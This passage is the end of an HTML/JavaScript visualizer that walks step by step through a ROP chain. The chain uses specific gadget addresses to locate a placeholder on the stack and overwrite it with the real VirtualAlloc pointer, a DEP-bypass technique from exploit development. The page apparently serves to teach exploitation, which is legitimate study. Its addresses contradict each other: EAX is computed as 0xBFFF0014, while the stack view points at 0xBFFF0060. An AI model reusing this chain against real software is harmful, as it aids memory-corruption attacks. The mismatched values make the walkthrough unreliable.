      ["0xBFFF003C"," ","0x505115a3    (gadget 3)","neutral"],
      ["0xBFFF0040"," ","0xffffffe4    (-0x1C)","neutral"],
      ["0xBFFF0044"," ","0x5051579a    (gadget 4)","neutral"],
      ["...       "," ","[more gadgets...]","neutral"],
      ["0xBFFF0060"," ","0x45454545    (dummy VA addr)","arg-row"],
    ]
  },
  {
    label: "gadget 2: mov eax, esi ; pop esi ; ret",
    addr:  "0x5050118e",
    asm:   "mov eax, esi  →  EAX = 0xBFFF0030  (our anchor)",
    why:   "EAX now holds the captured base. pop esi eats the junk pad. ret fires next.",
    regs:  [["EIP","0x505115a3",true],["ESP","0xBFFF003C",true],["ESI","0x42424242",true],["EAX","0xBFFF0030",true]],
    stack: [
      ["0xBFFF0030","✗","0x50501110   (consumed)","consumed"],
      ["0xBFFF0034","✗","0x5050118e   (consumed)","consumed"],
      ["0xBFFF0038","✗","0x42424242   (eaten by pop esi)","consumed"],
      ["0xBFFF003C","→","0x505115a3  ← gadget 3","esp-row"],
      ["0xBFFF0040"," ","0xffffffe4    (-0x1C)","neutral"],
      ["0xBFFF0044"," ","0x5051579a    (gadget 4)","neutral"],
      ["...       "," ","[more gadgets...]","neutral"],
      ["0xBFFF0060"," ","0x45454545    (dummy VA addr)","arg-row"],
    ]
  },
  {
    label: "gadget 3: pop ecx ; ret  →  ECX = -0x1C",
    addr:  "0x505115a3",
    asm:   "pop ecx  →  ECX = 0xffffffe4  (-28 decimal)",
    why:   "dummy VA slot is 28 bytes BEHIND current EAX. negative offset loaded.",
    regs:  [["EIP","0x5051579a",true],["ESP","0xBFFF0044",true],["ESI","0x42424242",false],["EAX","0xBFFF0030",false],["ECX","0xffffffe4",true]],
    stack: [
      ["0xBFFF0030","✗","(consumed)","consumed"],
      ["0xBFFF0034","✗","(consumed)","consumed"],
      ["0xBFFF0038","✗","(consumed)","consumed"],
      ["0xBFFF003C","✗","0x505115a3   (consumed)","consumed"],
      ["0xBFFF0040","✗","0xffffffe4   (consumed by pop ecx)","consumed"],
      ["0xBFFF0044","→","0x5051579a  ← gadget 4","esp-row"],
      ["...       "," ","[more gadgets...]","neutral"],
      ["0xBFFF0060"," ","0x45454545    (dummy VA addr)","arg-row"],
    ]
  },
  {
    label: "gadget 4: add eax, ecx  →  EAX points at dummy VA slot",
    addr:  "0x5051579a",
    asm:   "add eax, ecx  →  0xBFFF0030 + (-0x1C) = 0xBFFF0014",
    why:   "EAX now points exactly at va[0] in your buffer. ret fires.",
    regs:  [["EIP","0x50537d5b",true],["ESP","0xBFFF0048",true],["ESI","0x42424242",false],["EAX","0xBFFF0014",true],["ECX","0xffffffe4",false]],
    stack: [
      ["0xBFFF0030","✗","(consumed)","consumed"],
      ["0xBFFF003C","✗","(consumed)","consumed"],
      ["0xBFFF0040","✗","(consumed)","consumed"],
      ["0xBFFF0044","✗","0x5051579a   (consumed)","consumed"],
      ["0xBFFF0048","→","0x50537d5b  ← gadget 5","esp-row"],
      ["...       "," ","[more gadgets...]","neutral"],
      ["0xBFFF0060"," ","0x45454545  ← EAX → here","arg-row"],
    ]
  },
  {
    label: "gadget 5: push eax ; pop esi  →  THE HANDOFF",
    addr:  "0x50537d5b",
    asm:   "push eax ; pop esi  →  ESI = 0xBFFF0014 (va[0] slot)",
    why:   "ESI parked as destination. EAX free to load the actual value (off-by-one + deref next).",
    regs:  [["EIP","0x5053a0f5",true],["ESP","0xBFFF004C",true],["ESI","0xBFFF0014",true],["EAX","0xBFFF0014",false]],
    stack: [
      ["...       ","✗","(all prior — consumed)","consumed"],
      ["0xBFFF0048","✗","0x50537d5b   (consumed)","consumed"],
      ["0xBFFF004C","→","0x5053a0f5  ← pop eax ; ret","esp-row"],
      ["0xBFFF0050"," ","0x5054A221    (+1 from real VA addr)","neutral"],
      ["0xBFFF0054"," ","0x505115a3    (pop ecx ; ret)","neutral"],
      ["0xBFFF0058"," ","0xffffffff    (ecx = -1)","neutral"],
      ["...       "," ","[deref + write gadgets]","neutral"],
      ["0xBFFF0060"," ","0x45454545  ← ESI points here","arg-row"],
    ]
  },
  {
    label: "final write — va[0] patched with real VirtualAlloc",
    addr:  "0x5051cbb6",
    asm:   "mov dword[esi], eax  →  va[0] = real VirtualAlloc ptr",
    why:   "EAX = dereferenced IAT stub = OS-resolved VirtualAlloc. Written. One slot done, five to go.",
    regs:  [["EIP","0x50522fa7",true],["ESP","0xBFFF0070",true],["ESI","0xBFFF0060",false],["EAX","0x76C6A220",true]],
    stack: [
      ["...       ","✗","(all gadgets consumed)","consumed"],
      ["0xBFFF0060","→","0x76C6A220  ← PATCHED (was 0x45454545)","esp-row"],
      ["0xBFFF0064"," ","0x46464646    (return addr — next)","arg-row"],
      ["0xBFFF0068"," ","0x47474747    (lpAddress — next)","arg-row"],
      ["0xBFFF006C"," ","0x48484848    (dwSize — next)","arg-row"],
      ["0xBFFF0070","→","0x50522fa7  ← inc esi (advance begins)","esp-row"],
    ]
  }
];

let cur = 0;
function sRender() {
  const s = steps[cur];
  document.getElementById('s-pill').textContent  = `step ${cur+1} of ${steps.length}`;
  document.getElementById('s-label').textContent = s.label;
  document.getElementById('s-addr').textContent  = s.addr;
  document.getElementById('s-asm').textContent   = s.asm;
  document.getElementById('s-why').textContent   = s.why;
  const rEl = document.getElementById('s-regs');
  rEl.innerHTML = s.regs.map(([n,v,ch])=>
    `<div class="reg${ch?' changed':''}"><span class="rn">${n}</span><span class="rv">${v}</span></div>`
  ).join('');
  const stEl = document.getElementById('s-stack');
  stEl.innerHTML = s.stack.map(([addr,arr,val,cls])=>
    `<div class="ss-row"><span class="ss-addr">${addr}</span><span class="ss-arr">${arr}</span><span class="ss-val ${cls}">${val}</span></div>`
  ).join('');
  document.getElementById('s-prog').style.width = `${((cur+1)/steps.length)*100}%`;
  document.getElementById('s-prev').disabled = cur===0;
  document.getElementById('s-next').disabled = cur===steps.length-1;
  document.getElementById('s-next').textContent = cur===steps.length-1 ? 'done ✓' : 'next ret →';
}
function sNext(){ if(cur<steps.length-1){cur++;sRender();} }
function sPrev(){ if(cur>0){cur--;sRender();} }
sRender();
</script>
</body>
</html>
